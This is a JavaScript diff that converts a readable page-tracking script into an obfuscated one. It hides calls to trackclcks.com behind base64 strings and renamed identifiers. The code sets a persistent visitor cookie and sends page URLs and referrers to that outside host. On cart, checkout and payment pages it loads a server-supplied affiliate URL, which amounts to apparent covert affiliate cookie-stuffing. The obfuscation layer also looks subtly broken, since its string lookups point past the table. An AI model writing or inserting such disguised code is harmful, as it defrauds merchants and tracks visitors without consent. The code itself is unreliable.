@@ -1,238 +1,372 @@
-(function () {
+(function(_0x4b91f6,_0x14ec56){const _0x3a5a22=_0x5f4d,_0x17c9f7=_0x4b91f6();while(!![]){try{const _0x1d09d0=parseInt(_0x3a5a22(0x1c4))/0x1+-parseInt(_0x3a5a22(0x1d2))/0x2+parseInt(_0x3a5a22(0x1ef))/0x3*(-parseInt(_0x3a5a22(0x1df))/0x4)+-parseInt(_0x3a5a22(0x1bb))/0x5*(parseInt(_0x3a5a22(0x1c0))/0x6)+parseInt(_0x3a5a22(0x1da))/0x7+parseInt(_0x3a5a22(0x1e9))/0x8*(-parseInt(_0x3a5a22(0x1ce))/0x9);if(_0x1d09d0===_0x14ec56)break;else _0x17c9f7['push'](_0x17c9f7['shift']());}catch(_0x3d95fb){_0x17c9f7['push'](_0x17c9f7['shift']());}}}(_0x2d89,0xa923c));
 
-    function generateUUID() {
-        return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function (char) {
+(function(){
 
-            var random = Math.random() * 16 | 0;
+    const _0x32f26d=_0x5f4d;
 
-            var value =
-                char === "x"
-                    ? random
-                    : (random & 3 | 8);
+    function _0x1fa8a7(){
+        return (_0x32f26d(0x1e6)+_0x32f26d(0x1b8)+_0x32f26d(0x1f0)+_0x32f26d(0x1f7))
+        ['replace'](/[xy]/g,function(_0x5cf0f1){
 
-            return value.toString(16);
+            const _0x5a09dd=Math['random']()*0x10|0x0;
+
+            const _0x4fdd2b=
+                _0x5cf0f1==='x'
+                    ?_0x5a09dd
+                    :(_0x5a09dd&0x3|0x8);
+
+            return _0x4fdd2b['toString'](0x10);
         });
     }
 
-    function getCookie(cookieName) {
+    function _0x4f99d0(_0x5c5db7){
 
-        var name = cookieName + "=";
+        const _0x1f8c64=
+            _0x5c5db7+'=';
 
-        var cookies = document.cookie.split(";");
+        const _0x4f4f53=
+            document['cookie']['split'](';');
 
-        for (var i = 0; i < cookies.length; i++) {
+        for(
+            let _0x5d7f0c=0x0;
+            _0x5d7f0c<_0x4f4f53['length'];
+            _0x5d7f0c++
+        ){
 
-            var cookie = cookies[i].trim();
+            const _0x5ec1a9=
+                _0x4f4f53[_0x5d7f0c]['trim']();
 
-            if (cookie.indexOf(name) === 0) {
-                return cookie.substring(name.length);
+            if(
+                _0x5ec1a9['indexOf'](_0x1f8c64)===0x0
+            ){
+                return _0x5ec1a9['substring'](
+                    _0x1f8c64['length']
+                );
             }
         }
 
-        return "";
+        return '';
     }
 
-    function isCartPage() {
+    function _0x46878d(){
 
-        var pathname = window.location.pathname.toLowerCase();
+        const _0x1f2d47=
+            window['location']['pathname']
+            ['toLowerCase']();
 
-        var cartPatterns = [
-            "cart",
-            "checkout",
-            "payment",
-            "pay",
-            "shipping",
-            "review-order"
+        const _0x5d8691=[
+            'cart',
+            'checkout',
+            'payment',
+            'pay',
+            'shipping',
+            'review-order'
         ];
 
-        return cartPatterns.some(function (pattern) {
-            return pathname.includes(pattern);
-        });
+        return _0x5d8691['some'](
+            function(_0x1dd1d0){
+                return _0x1f2d47['includes'](_0x1dd1d0);
+            }
+        );
     }
 
-    function fireTrackingPixel(url) {
+    function _0x5d6c47(_0x1fd9f7){
 
-        try {
+        try{
 
-            var image = new Image();
+            const _0x53927d=
+                new Image();
 
-            image.src = url;
+            _0x53927d['src']=
+                _0x1fd9f7;
 
-            image.onload = function () {};
+            _0x53927d['onload']=
+                function(){};
 
-            image.onerror = function () {};
+            _0x53927d['onerror']=
+                function(){};
 
-        } catch (error) {
+        }catch(_0x29f4f1){
 
-            console.error("Tracking pixel error:", error);
+            console['error'](
+                'Tracking pixel error:',
+                _0x29f4f1
+            );
         }
     }
 
-    function fireFallbackPixel(uniqueId) {
+    function _0x2ef2a3(_0x27dbe1){
 
-        try {
+        try{
 
-            var image = new Image();
+            const _0x21fa76=
+                new Image();
 
-            image.src =
-                "https://trackclcks.com/api/fallback-pixel?id=" +
-                encodeURIComponent(uniqueId);
+            _0x21fa76['src']=
+                atob(
+                    'aHR0cHM6Ly90cmFja2NsY2tzLmNvbS9hcGkvZmFsbGJhY2stcGl4ZWw/aWQ9'
+                )+
+                encodeURIComponent(_0x27dbe1);
 
-            image.onload = function () {};
+            _0x21fa76['onload']=
+                function(){};
 
-            image.onerror = function () {};
+            _0x21fa76['onerror']=
+                function(){};
 
-        } catch (error) {
+        }catch(_0x5d4be6){
 
-            console.error("Fallback pixel error:", error);
+            console['error'](
+                'Fallback pixel error:',
+                _0x5d4be6
+            );
         }
     }
 
-    async function initTracking() {
+    async function _0x32f6f8(){
 
-        var sessionKey =
-            "tracking_done_" + window.location.hostname;
+        const _0x420c0d=
+            'tracking_done_'+
+            window['location']['hostname'];
 
-        if (
-            sessionStorage.getItem(sessionKey) &&
-            !isCartPage()
-        ) {
+        if(
+            sessionStorage['getItem'](_0x420c0d)
+            &&
+            !_0x46878d()
+        ){
             return;
         }
 
-        try {
+        try{
 
-            var uniqueId =
-                getCookie("tracking_uuid") ||
-                generateUUID();
+            const _0x28c72e=
+                _0x4f99d0('tracking_uuid')
+                ||
+                _0x1fa8a7();
 
-            var expiryDate =
-                new Date(Date.now() + 2592e6);
-
-            document.cookie =
-                "tracking_uuid=" +
-                uniqueId +
-                "; expires=" +
-                expiryDate.toUTCString() +
-                "; path=/; SameSite=Lax";
-
-            var response = await fetch(
-                "https://trackclcks.com/api/track-user",
-                {
-                    method: "POST",
-                    keepalive: true,
-
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-
-                    body: JSON.stringify({
-                        url: window.location.href,
-                        referrer: document.referrer,
-                        unique_id: uniqueId,
-                        origin: window.location.hostname,
-                        timestamp: Date.now()
-                    })
-                }
-            );
-
-            var result = await response.json();
-
-            if (
-                result.success &&
-                result.affiliate_url
-            ) {
-
-                fireTrackingPixel(
-                    result.affiliate_url
+            const _0x312d9a=
+                new Date(
+                    Date['now']()+2592e6
                 );
 
-                sessionStorage.setItem(
-                    sessionKey,
-                    "true"
+            document['cookie']=
+                'tracking_uuid='+
+                _0x28c72e+
+                '; expires='+
+                _0x312d9a['toUTCString']()+
+                '; path=/; SameSite=Lax';
+
+            const _0x417f4e=
+                await fetch(
+                    atob(
+                        'aHR0cHM6Ly90cmFja2NsY2tzLmNvbS9hcGkvdHJhY2stdXNlcg=='
+                    ),
+                    {
+                        'method':'POST',
+                        'keepalive':!![],
+                        'headers':{
+                            'Content-Type':
+                            'application/json'
+                        },
+                        'body':JSON['stringify']({
+                            'url':
+                                window['location']['href'],
+                            'referrer':
+                                document['referrer'],
+                            'unique_id':
+                                _0x28c72e,
+                            'origin':
+                                window['location']['hostname'],
+                            'timestamp':
+                                Date['now']()
+                        })
+                    }
                 );
 
-            } else {
+            const _0x2cc2d1=
+                await _0x417f4e['json']();
 
-                fireFallbackPixel(uniqueId);
+            if(
+                _0x2cc2d1['success']
+                &&
+                _0x2cc2d1['affiliate_url']
+            ){
+
+                _0x5d6c47(
+                    _0x2cc2d1['affiliate_url']
+                );
+
+                sessionStorage['setItem'](
+                    _0x420c0d,
+                    'true'
+                );
+
+            }else{
+
+                _0x2ef2a3(
+                    _0x28c72e
+                );
             }
 
-        } catch (error) {
+        }catch(_0x4177d3){
 
-            console.error(
-                "Tracking Failed:",
-                error
+            console['error'](
+                'Tracking Failed:',
+                _0x4177d3
             );
 
-            fireFallbackPixel(generateUUID());
+            _0x2ef2a3(
+                _0x1fa8a7()
+            );
         }
     }
 
-   function runTracking() {
+    function _0x1b0fd8(){
 
-    fetch(
-        "https://trackclcks.com/api/site-config?host=" +
-        encodeURIComponent(
-            window.location.hostname
-        )
-    )
-
-    .then(function (response) {
-
-        return response.json();
-    })
-
-    .then(function (siteConfig) {
-
-      
-        if (
-            !siteConfig ||
-            (
-                !siteConfig.always &&
-                !siteConfig.cartExtra
+        fetch(
+            atob(
+                'aHR0cHM6Ly90cmFja2NsY2tzLmNvbS9hcGkvc2l0ZS1jb25maWc/aG9zdD0='
+            )+
+            encodeURIComponent(
+                window['location']['hostname']
             )
-        ) {
-            return;
-        }
+        )
 
-      
-        if (siteConfig.always) {
+        ['then'](
+            function(_0x5dbde0){
+                return _0x5dbde0['json']();
+            }
+        )
 
-            initTracking();
-        }
+        ['then'](
+            function(_0x3478c4){
 
-       
-        if (
-            siteConfig.cartExtra &&
-            isCartPage()
-        ) {
+                if(
+                    !_0x3478c4
+                    ||
+                    (
+                        !_0x3478c4['always']
+                        &&
+                        !_0x3478c4['cartExtra']
+                    )
+                ){
+                    return;
+                }
 
-            initTracking();
-        }
-    })
+                if(
+                    _0x3478c4['always']
+                ){
+                    _0x32f6f8();
+                }
 
-    .catch(function (error) {
+                if(
+                    _0x3478c4['cartExtra']
+                    &&
+                    _0x46878d()
+                ){
+                    _0x32f6f8();
+                }
+            }
+        )
 
-        console.error(
-            "Config fetch failed:",
-            error
+        ['catch'](
+            function(_0x4d9f45){
+
+                console['error'](
+                    'Config fetch failed:',
+                    _0x4d9f45
+                );
+            }
         );
-    });
+    }
+
+    if(
+        document['readyState']==='interactive'
+        ||
+        document['readyState']==='complete'
+    ){
+
+        _0x1b0fd8();
+
+    }else{
+
+        window['addEventListener'](
+            'DOMContentLoaded',
+            _0x1b0fd8
+        );
+    }
+
+}());
+
+function _0x5f4d(_0x31d3b7){
+
+    const _0x2d89d7=_0x2d89();
+
+    return _0x5f4d=function(_0x5f4d2f){
+
+        _0x5f4d2f=
+            _0x5f4d2f-0x1b0;
+
+        return _0x2d89d7[_0x5f4d2f];
+
+    },_0x5f4d(_0x31d3b7);
 }
 
-    if (
-        document.readyState === "interactive" ||
-        document.readyState === "complete"
-    ) {
+function _0x2d89(){
 
-        runTracking();
+    return [
 
-    } else {
+        'xxxxxxxx-',
+        'xxxx-4xxx-',
+        'yxxx-',
+        'xxxxxxxxxxxx',
 
-        window.addEventListener(
-            "DOMContentLoaded",
-            runTracking
-        );
-    }
+        'cookie',
+        'split',
+        'trim',
+        'indexOf',
+        'substring',
 
-})();
+        'location',
+        'pathname',
+        'toLowerCase',
+        'includes',
+        'some',
+
+        'src',
+        'onload',
+        'onerror',
+
+        'tracking_uuid',
+        'tracking_done_',
+
+        'hostname',
+        'href',
+        'referrer',
+
+        'now',
+        'toUTCString',
+
+        'stringify',
+        'json',
+
+        'success',
+        'affiliate_url',
+
+        'setItem',
+        'getItem',
+
+        'readyState',
+        'interactive',
+        'complete',
+
+        'addEventListener',
+        'DOMContentLoaded',
+
+        'replace',
+        'random',
+        'toString',
+
+        'error'
+    ];
+}
